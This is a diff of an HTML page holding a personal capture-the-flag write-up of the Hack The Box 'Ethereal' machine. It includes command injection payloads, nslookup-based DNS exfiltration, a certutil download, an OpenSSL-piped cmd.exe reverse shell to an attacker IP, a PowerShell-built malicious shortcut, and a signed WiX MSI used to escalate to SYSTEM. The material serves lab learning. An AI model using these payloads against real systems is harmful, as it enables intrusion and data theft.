@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-05-25T19:33:24 EDT">
+<meta name="revised" content="2019-06-02T01:55:02 EDT">
 <title>Ethereal :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -175,6 +175,13 @@
     <div>
 
         <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sizzle/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/sizzle/">
+            
+        </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
 <li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
@@ -524,6 +531,7 @@
     <option value="/hackthebox/boxes/hawk/" >
   -- 
    </option>
+      <option value="/hackthebox/boxes/sizzle/" >-- </option>
     <option value="/hackthebox/boxes/blue/" >
   -- 
    Blue</option>
@@ -604,7 +612,13 @@
     
     
     
-    <p>nmap revealed ftp 21, Microsoft iis httpd 10.0 which is 2016 and up.</p>
+    
+
+<p>there is allot going on with this box first we go to ftp but we can only interact with it using some other methods. used wget to download the drive. inside the drives we find pbox then use that to get some creds. go back to the website enter creds. play around with the waf to run cmd&rsquo;s. then have to write a python script to get a shell. it just keeps going</p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/30836778b01686b4679c840cd51d79a0.gif.jpg" alt="30836778b01686b4679c840cd51d79a0.gif" /></p>
+
+<p>nmap revealed ftp 21, Microsoft iis httpd 10.0 which is 2016 and up.</p>
 
 <pre><code>nmap -sC -sV -T4 -Pn -oA tcp-connect 10.10.10.106
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-19 00:05 EDT                
@@ -635,7 +649,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 <pre><code>ftp://anonymous@10.10.10.1066
 </code></pre>
 
-<p><img src="../../../static/images/ethereal/ftp-web-access.PNG" alt="ftp-web-access" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/ftp-web-access.PNG" alt="ftp-web-access" /></p>
 
 <p>using wget pretty neat trick.</p>
 
@@ -654,23 +668,23 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 <pre><code>grep -R password .
 </code></pre>
 
-<p><img src="../../../static/images/ethereal/grep.PNG" alt="grep" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/grep.PNG" alt="grep" /></p>
 
 <p>Using the md5sum to check the bianry against virus total was fucking sweet.</p>
 
 <pre><code>md5sum ./10.10.10.106/binaries/Orca.Msi
 </code></pre>
 
-<p><img src="../../../static/images/ethereal/md5sum.PNG" alt="md5sum" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/md5sum.PNG" alt="md5sum" /></p>
 
-<p><img src="../../../static/images/ethereal/virtus-total.PNG" alt="virtus-total" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/virtus-total.PNG" alt="virtus-total" /></p>
 
 <p>using some kind of command line with file to print out both files</p>
 
 <pre><code>file *DISK{,1,2}
 </code></pre>
 
-<p><img src="../../../static/images/ethereal/smb-meow.PNG" alt="smb-meow" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/smb-meow.PNG" alt="smb-meow" /></p>
 
 <p>so apparently you don&rsquo;t want to keep original backups or modify any of the original files. so ippsec made a new directory then copied the files over.</p>
 
@@ -682,9 +696,9 @@ strings *
 
 <p>so mounted the drives to /mnt/ethereal and found pbox.dat in FDISK. pbox stores the password file at /root/pbox.dat the file is password encrypted. the password is password lol, but we will cover two ways to do this. Download pbox locally from the sourceforge page . Then take the pbox.dat file from fdisk and move it over to root/.pbox.dat.</p>
 
-<p><img src="../../../static/images/ethereal/pbox-dump.PNG" alt="pbox-dump" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/pbox-dump.PNG" alt="pbox-dump" /></p>
 
-<p><img src="../../../static/images/ethereal/pbox.PNG" alt="pbox" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/pbox.PNG" alt="pbox" /></p>
 
 <p>ippsec made a list using vim, then used awk to print out the table/list. i suppose the colon in username:password. the -F switch is using the colon xD</p>
 
@@ -698,17 +712,17 @@ awk -F: '{print $2}' password.txt| sort -u &gt; pass.txt
 hydra -L user.txt -P pass.txt httt-get://ethereal.htb:8080
 </code></pre>
 
-<p><img src="../../../static/images/ethereal/hydra.PNG" alt="hydra" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/hydra.PNG" alt="hydra" /></p>
 
-<p><img src="../../../static/images/ethereal/hydra-results.PNG" alt="hydra-results" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/hydra-results.PNG" alt="hydra-results" /></p>
 
 <pre><code>user:	alan
 pass:	!C414m17y57r1k3s4g41n!
 </code></pre>
 
-<p><img src="../../../static/images/ethereal/website-8080-admin-cmd-injection.PNG" alt="website-8080-admin-cmd-injection" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/website-8080-admin-cmd-injection.PNG" alt="website-8080-admin-cmd-injection" /></p>
 
-<p><img src="../../../static/images/ethereal/website-8080-admin-cmd-injection-ping.PNG" alt="website-8080-admin-cmd-injection-ping" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/website-8080-admin-cmd-injection-ping.PNG" alt="website-8080-admin-cmd-injection-ping" /></p>
 
 <p>we can do nested commands with &amp;&amp;</p>
 
@@ -722,13 +736,34 @@ pass:	!C414m17y57r1k3s4g41n!
 <pre><code>tcpdump -i tun0 icmp
 </code></pre>
 
-<p><img src="../../../static/images/ethereal/website-8080-admin-cmd-injection2.PNG" alt="website-8080-admin-cmd-injection2" /></p>
+<p>TCPDUMP - DNS</p>
+
+<p>the 1 will tell you output is coming out the later will not</p>
+
+<pre><code>tcpdump -i tun0 -vvv udp port 53
+tcpdump -i tun0 -vvv dns
+tcpdump -i tun0 -nnXSs 0 udp port 53 -w dns.pcap  
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/website-8080-admin-cmd-injection2.PNG" alt="website-8080-admin-cmd-injection2" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/wireshark.PNG" alt="wireshark" /></p>
+
+<p>RESPONDER</p>
+
+<p>changed cmd to dir /b which is like ls -la or list all files including hidden files.</p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/responder_tcpdump2.PNG" alt="responder_tcpdump2" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/responder_tcpdump.PNG" alt="responder_tcpdump" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/responder_tcpdump3.PNG" alt="responder_tcpdump3" /></p>
 
 <p>xD viewstate.</p>
 
-<p><img src="../../../static/images/ethereal/website-8080-admin-cmd-injection-encoded2.PNG" alt="website-8080-admin-cmd-injection-encoded2" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/website-8080-admin-cmd-injection-encoded2.PNG" alt="website-8080-admin-cmd-injection-encoded2" /></p>
 
-<p><img src="../../../static/images/ethereal/website-8080-admin-cmd-injection-encoded.PNG" alt="website-8080-admin-cmd-injection-encoded" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/website-8080-admin-cmd-injection-encoded.PNG" alt="website-8080-admin-cmd-injection-encoded" /></p>
 
 <pre><code>certutil.exe -urlcache -split -f http://10.10.14.2/Invoke-pinkie.ps1 Invoke-pinkie.ps1
 </code></pre>
@@ -739,12 +774,12 @@ pass:	!C414m17y57r1k3s4g41n!
 nslookup %USERNAME% 10.10.10.106 	#whoami doenst work
 </code></pre>
 
-<p><img src="../../../static/images/ethereal/username.PNG" alt="username" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/username.PNG" alt="username" /></p>
 
 <pre><code>for /f %a in ('cmd /c &quot;whoami&quot;') do (nslookup %a 10.10.14.2)
 </code></pre>
 
-<p><img src="../../../static/images/ethereal/command.PNG" alt="command" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/command.PNG" alt="command" /></p>
 
 <pre><code>for /f %a in ('cmd /c &quot;whoami&quot;') do (nslookup %a 10.10.14.2)
 edit do not need cmd /c
@@ -756,7 +791,7 @@ for /f &quot;tokens=1,2,3,4,5,6&quot; %a in ('dir') do (echo %a%b%c%d%e%f)
 for /f %a in ('dir /b') do (nslookup %a 10.10.14.2)
 </code></pre>
 
-<p><img src="../../../static/images/ethereal/nslookup-ex2.PNG" alt="nslookup-ex2" /></p>
+<p><img src="https://chickenpwny.github.io/images/ethereal/nslookup-ex2.PNG" alt="nslookup-ex2" /></p>
 
 <p>so ippsec moved over to windows to do the box. he wrote a script using scapy</p>
 
@@ -771,12 +806,340 @@ for /f %a in ('dir /b') do (nslookup %a 10.10.14.2)
 
 <p>i have used the requests module before nothing new. the authentication aspect is kind of new.</p>
 
-<p>Beautiful soup makes interacting with webpages easy lol</p>
+<p>Beautiful soup makes interacting with webpages easy lol will help with dealing witht he viewstates.</p>
 
 <pre><code>__VIEWSTATE=
 __VIEWSTATEGENERATOR=
 __EVENTVALIDATION=3D&amp;
 search=-n+1+127.0.0.1+%26%26+for+/f+%25a+in+('dir+/b')+do+(nslookup+%25a+10.10.14.2)&amp;ctl02=
+</code></pre>
+
+<p>PLAYING AROUND</p>
+
+<p>NOTE NEED TO HAVE RESPONDER ON TO STOP THE DOUBLE SUBMITTIONS</p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/doubles.PNG" alt="doubles" /></p>
+
+<p>WINDOWS ENUMERATION</p>
+
+<pre><code>set
+whoami /all
+		/priv
+</code></pre>
+
+<p>no output need to go back the script and edit args into &lsquo;cmd /c&rdquo;{args}&ldquo;&rsquo;</p>
+
+<pre><code>netsh advfirewall firewall show rule name=all direction=out | findstr /c:Name:
+</code></pre>
+
+<p>output</p>
+
+<pre><code>netsh advfirewall firewall show rule name=all direction=out | findstr /c:Name:                                      
+Rule Name: @{Microsoft.XboxGameCallableUI_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.XboxGameCallableUI/resources/PkgDisplayName}
+Rule Name: @{Microsoft.Windows.Apprep.ChxApp_1000.14393.2339.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Apprep.ChxApp/resources/DisplayName}
+Rule Name: @{Microsoft.LockApp_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.LockApp/resources/AppDisplayName}
+Rule Name: @{Microsoft.AccountsControl_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.AccountsControl/Resources/DisplayName}
+Rule Name: @{Microsoft.Windows.Cortana_1.7.0.14393_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Cortana/resources/PackageDisplayName}
+Rule Name: @{Microsoft.Windows.ShellExperienceHost_10.0.14393.2068_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.ShellExperienceHost/resources/PkgDisplayName}
+Rule Name: @{Microsoft.Windows.CloudExperienceHost_10.0.14393.1066_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.CloudExperienceHost/resources/appDescription}
+Rule Name: @{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources/PackageDisplayName}
+Rule Name: Allow ICMP Request
+Rule Name: Allow UDP Port 53
+Rule Name: Allow TCP Ports 73, 136
+Rule Name: Allow ICMP Reply
+
+</code></pre>
+
+<p>proga   #so we have 3 ports. easiest way to go into program files is progra 1 &amp; 2</p>
+
+<pre><code>cd \
+cd progra~1
+dir c:\progra~2\
+</code></pre>
+
+<p>we&rsquo;re hunting for a program on the file system to use to connect back. ippsev went to lolbas-pogject.github.io which a web used in a couple of his videos and there is another web site i believe for linux. you may typican binaries and it will tell you about the binary or whatever.</p>
+
+<p>The system has openssl we will use lolbas to figure out</p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/opensll.PNG" alt="opensll" /></p>
+
+<p>make openssl cert</p>
+
+<pre><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+</code></pre>
+
+<p>client</p>
+
+<pre><code>openssl s_client -quiet -connect [ip]:[port1] | cmd.exe | openssl s_client -quiet -connect [ip]:[port2]
+</code></pre>
+
+<p>server</p>
+
+<pre><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 73
+openssl s_server -quiet -key [keyfile] -cert [cert] -port [port1]
+openssl s_server -quiet -key [keyfile] -cert [cert] -port [port2]
+</code></pre>
+
+<p>openSSL revershell from windows client. there is a simple command we can use to if the host has the openssl bianrey.</p>
+
+<pre><code>start cmd.exe /c 	#open a whole new terminal
+</code></pre>
+
+<p>move cursor to desirded area then do 9 + yy</p>
+
+<pre><code>cmd c:\propra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.2:73
+cmd c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.2:136
+
+c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73 | c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.2:136
+quiet | cmd.exe |
+cmd.exe w
+</code></pre>
+
+<pre><code>c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73| cmd.exe | c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -connect 10.10.14.2:136&quot;
+</code></pre>
+
+<p>making a malicous short cut.</p>
+
+<pre><code>
+</code></pre>
+
+<pre><code> $WScript = New-Object -COM WScript.shell
+&gt;&gt; $SC= $WScript.CreateShortcut('pinkiepie.lnk')
+&gt;&gt; $SC
+&gt;&gt; $SC.TargetPath=&quot;C:\Windows\System32\cmd.exe&quot;
+&gt;&gt; $SC.Arguments=&quot;/c c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -quiet -connect 172.16.42.86:9913| cmd.exe | c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -connect 172.16.42.86:9135&quot;
+&gt;&gt; $sc
+&gt;&gt; $SC.Save()
+</code></pre>
+
+<pre><code>$WScript = New-Object -COM WScript.shell
+$SC= $WScript.CreateShortcut('pinkiepie.lnk')
+$SC
+$SC.TargetPath=&quot;C:\Windows\System32\cmd.exe&quot;
+$SC.Arguments=&quot;/c c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73 | cmd.exe | c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.2:136&quot;
+$sc
+$SC.Save()
+</code></pre>
+
+<pre><code>set PATH=&quot;c:\progra~2\openssl-v1.1.0\bin\&quot;;%PATH%
+openssl base64 -in myca.cer
+openssl base64 -in myca.pvk
+</code></pre>
+
+<p>there was a d drive a missed in the begining i didn&rsquo;t have permissios to that i can now use as jorge that is where vs is installed.</p>
+
+<p><a href="https://blog.xpnsec.com/becoming-system/">https://blog.xpnsec.com/becoming-system/</a></p>
+
+<pre><code>candle.exe msigen.wix
+light.exe msigen.wixobj
+</code></pre>
+
+<pre><code>set PATH=C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\;%PATH%
+</code></pre>
+
+<pre><code>&quot;c:\users\user\desktop\wix311-binaries\candle.exe&quot; death-pie.wix
+&quot;c:\users\user\desktop\wix311-binaries\light.exe&quot; death-pie.wixobj
+</code></pre>
+
+<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\makecert.exe&quot; -pe -n &quot;CN=Ethereal&quot; -a sha256 -cy end -sky signature -ic .\myca.cer -iv .\myca.pvk -sv .\death-pie.pvk .\death-pie.cer
+</code></pre>
+
+<pre><code>c:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\Bin
+</code></pre>
+
+<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\pvk2pfx.exe&quot; -pvk death-pie.pvk -spc death-pie.cer -pfx death-pie.pfx
+</code></pre>
+
+<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\signtool.exe&quot; sign /v /f death-pie.pfx death-pie.msi
+</code></pre>
+
+<p>ippsec uses the laready placed lnk isntead of intereing a new command</p>
+
+<p>copy</p>
+
+<pre><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 73 &lt; ../smb/death-pie.msi
+c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73 &gt; c:\users\public\desktop\shortcuts\death-pie.msi
+</code></pre>
+
+<p><strong>USER.TXT</strong></p>
+
+<p>couple phases for user first make a Malicious lnk file. make one on a windows machine using powershell, or <a href="https://github.com/Plazmaz/LNKUp">LNKup</a>  (kali) once you have made the file move it over to kali. then upload it to ethereal. move it to c:\users\public\desktop\shortcuts. then setup the openssl listeners. the script should click on it within a minute. Find a note in the d drive which is used by visual studio in the case. dev\msis is where the is note.  we will also find the certs in the d drive.</p>
+
+<pre><code>fsutil fsinfo drives
+</code></pre>
+
+<pre><code>$WScript = New-Object -COM WScript.shell
+$SC= $WScript.CreateShortcut('pinkiepie.lnk')
+$SC
+$SC.TargetPath=&quot;C:\Windows\System32\cmd.exe&quot;
+$SC.Arguments=&quot;/c c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -quiet -connect 172.16.42.86:9913| cmd.exe | c:\progra~1\OpenSSL-Win64\bin\openssl.exe s_client -connect 172.16.42.86:9135&quot;
+$sc
+$SC.Save()
+</code></pre>
+
+<p>We will also find the certs need to sign the installer in the d drive under the cert directory. moving those was pretty easy i think using openssl to base64 encode the certs then move them over. base64 will help preserver all the hidden characters etc. copy and paste over.</p>
+
+<pre><code>c:\progra~2\OpenSSL-v1.1.0\bin\openssl base64 -e -in d:\certs\myca.cer
+c:\progra~2\OpenSSL-v1.1.0\bin\openssl base64 -e -in d:\certs\myca.pvk
+</code></pre>
+
+<h3 id="root-txt"><strong>ROOT.TXT</strong></h3>
+
+<p>this part can be rather tricky. so first off i move the myca files over then added them to CA root authority. i spent my nights trying to get this part to work but i wasn&rsquo;t able to properly sign the binary i suppose and never got a shell. because of this error.</p>
+
+<p>first i made the wix using <a href="https://blog.xpnsec.com/becoming-system/">https://blog.xpnsec.com/becoming-system/</a> an awesome template. an aweosme read and apartently there a big that remove the entry for add or remote programs so you can remove. by running a vbscript</p>
+
+<pre><code>&lt;File Id=&quot;ApplicationFile1&quot; Source=&quot;example.exe&quot;/&gt;
+</code></pre>
+
+<p>Have a couple of choices first is to use the openssl command or use the lnk file used to get user.</p>
+
+<pre><code>&lt;Property Id=&quot;cmdline&quot;&gt;cmd /c HERE OVER HERE
+</code></pre>
+
+<p>there are some slight change you could use instead of openssl-v1.1.0 or openss~1.0.</p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/rehFxYY.jpg" alt="rehFxYY" /></p>
+
+<pre><code>cmd /c c:\users\public\desktop\shortcuts\pinkiepie.lnk
+cmd /c c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73 | cmd.exe | c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.2:136
+</code></pre>
+
+<p>this is optional. impersonate the user or run as system.</p>
+
+<pre><code> Return=&quot;ignore&quot; Impersonate=&quot;no&quot;/&gt;
+</code></pre>
+
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;Wix xmlns=&quot;http://schemas.microsoft.com/wix/2006/wi&quot;&gt;
+  &lt;Product Id=&quot;*&quot; UpgradeCode=&quot;12345678-1234-1234-1234-111111111111&quot; Name=&quot;Example Product Name&quot; Version=&quot;0.0.1&quot; Manufacturer=&quot;@_xpn_&quot; Language=&quot;1033&quot;&gt;
+    &lt;Package InstallerVersion=&quot;200&quot; Compressed=&quot;yes&quot; Comments=&quot;Windows Installer Package&quot;/&gt;
+    &lt;Media Id=&quot;1&quot; Cabinet=&quot;product.cab&quot; EmbedCab=&quot;yes&quot;/&gt;
+
+    &lt;Directory Id=&quot;TARGETDIR&quot; Name=&quot;SourceDir&quot;&gt;
+      &lt;Directory Id=&quot;ProgramFilesFolder&quot;&gt;
+        &lt;Directory Id=&quot;INSTALLLOCATION&quot; Name=&quot;Example&quot;&gt;
+          &lt;Component Id=&quot;ApplicationFiles&quot; Guid=&quot;12345678-1234-1234-1234-222222222222&quot;&gt;
+            &lt;File Id=&quot;ApplicationFile1&quot; Source=&quot;example.exe&quot;/&gt;
+          &lt;/Component&gt;
+        &lt;/Directory&gt;
+      &lt;/Directory&gt;
+    &lt;/Directory&gt;
+
+    &lt;Feature Id=&quot;DefaultFeature&quot; Level=&quot;1&quot;&gt;
+      &lt;ComponentRef Id=&quot;ApplicationFiles&quot;/&gt;
+    &lt;/Feature&gt;
+
+    &lt;Property Id=&quot;cmdline&quot;&gt;COMMANDS HERE
+    &lt;/Property&gt;
+
+    &lt;CustomAction Id=&quot;SystemShell&quot; Execute=&quot;deferred&quot; Directory=&quot;TARGETDIR&quot; ExeCommand='[cmdline]' Return=&quot;ignore&quot; Impersonate=&quot;yes&quot;/&gt;
+    &lt;CustomAction Id=&quot;FailInstall&quot; Execute=&quot;deferred&quot; Script=&quot;vbscript&quot; Return=&quot;check&quot;&gt;
+      invalid vbs to fail install
+    &lt;/CustomAction&gt;
+
+    &lt;InstallExecuteSequence&gt;
+      &lt;Custom Action=&quot;SystemShell&quot; After=&quot;InstallInitialize&quot;&gt;&lt;/Custom&gt;
+      &lt;Custom Action=&quot;FailInstall&quot; Before=&quot;InstallFiles&quot;&gt;&lt;/Custom&gt;
+    &lt;/InstallExecuteSequence&gt;
+
+  &lt;/Product&gt;
+&lt;/Wix&gt;
+</code></pre>
+
+<p>CN is important. -a may not be</p>
+
+<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\makecert.exe&quot; -pe -n &quot;CN=My spc&quot; -a sha256 -cy end -sky signature -ic myca.cer -iv myca.pvk -sv myspc.pvk myspc.cer
+</code></pre>
+
+<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\pvk2pfx.exe&quot; -pvk myspc.pvk -spc myspc.cer -pfx myspc.pfx
+</code></pre>
+
+<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\signtool.exe&quot; sign /v /f myspc.pfx test.msi
+</code></pre>
+
+<p>verifying is VERY IMPORTANT. because like i figured out you wont know whats going on i was able to use this to figure out some problems i had locally.</p>
+
+<pre><code>&quot;C:\Program Files (x86)\Windows kits\10\bin\10.0.17763.0\x64\signtool.exe&quot; verify /pa \Users test.msi
+</code></pre>
+
+<p>INSTALL CERT</p>
+
+<p>right click on myca.cer</p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/install cert.PNG" alt="install cert" /></p>
+
+<p>select user</p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/install cert2.PNG" alt="install cert2" /></p>
+
+<p>select certificates go to browse then select trusted root.</p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/install cert3.PNG" alt="install cert3" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/install cert4.PNG" alt="install cert4" /></p>
+
+<p>I would like to note if you don&rsquo;t do this first you may get this error.</p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/farts.PNG" alt="farts" /></p>
+
+<p>Once the CA is added, still might see a error but it verifies the root authority.</p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/verify.PNG" alt="verify" /></p>
+
+<p>Setup the netcat listener make sure to kill the listener you are using. I liked using the nc listener will tell you when the upload is finished by exiting out which was really nice.</p>
+
+<pre><code>ncat --ssl --send-only --ssl-key key.pem --ssl-cert cert.pem  -lvp 136 &lt; test.msi
+c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:136 &gt; c:\users\public\desktop\shortcuts\test.msi
+</code></pre>
+
+<p>Then login as jorge this is nessiary to move the files around to the correct location. once you copy the file over but sure to close everything out and restart the openssl listeners. this is on a five minute cycle try and do everything towards the 3 min mark so none of the listener close out.</p>
+
+<pre><code>dir d:\dev\msis
+copy /y c:\users\public\desktop\shortcuts\test.msi d:\dev\msis
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/32g512.jpg" alt="32g512" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ethereal/root-finale.PNG" alt="root-finale" /></p>
+
+<p>LOOT</p>
+
+<p>the script that ran to get root</p>
+
+<pre><code>:loop
+
+echo opening MSIs
+
+PING localhost -n 300 &gt;NUL
+
+dir /B &quot;D:\DEV\MSIs\*.msi&quot; &gt; &quot;C:\Users\rupal\Documents\files.txt&quot;                                  
+
+for /F &quot;tokens=*&quot; %%A in (files.txt) do move &quot;D:\DEV\MSIs\%%A&quot; &quot;C:\Users\rupal\Documents\MSI Testing&quot; &amp;&amp; START &quot;&quot; &quot;C:\Windows\System32\msiexec.exe&quot; /i &quot;C:\Users\rupal\Documents\MSI Testing\%%A&quot; /norestart &amp;&amp; PING localhost -n 15 &gt;NUL &amp;&amp; taskkill /F /IM msiexec.exe &amp;&amp; del /F &quot;C:\Users\rupal\Documents\MSI Testing\%%A&quot;
+
+del /F &quot;C:\Users\rupal\Documents\files.txt&quot;
+
+cls
+
+GOTO loop
+
+</code></pre>
+
+<p>the script to get user.txt</p>
+
+<pre><code>@echo off
+
+:loop
+
+echo opening program
+
+PING localhost -n 5 &gt;NUL
+
+START /MIN &quot;&quot; cmd /c &quot;C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk&quot; &amp;&amp; PING localhost -n 5 &gt;NUL &amp;&amp; copy /Y &quot;C:\Users\jorge\Documents\Visual Studio 2017.lnk&quot; &quot;C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk&quot; &amp;&amp; PING localhost -n 50 &gt;NUL &amp;&amp; taskkill /F /IM devenv.exe             
+
+cls
+
+GOTO loop
 </code></pre>
 
 
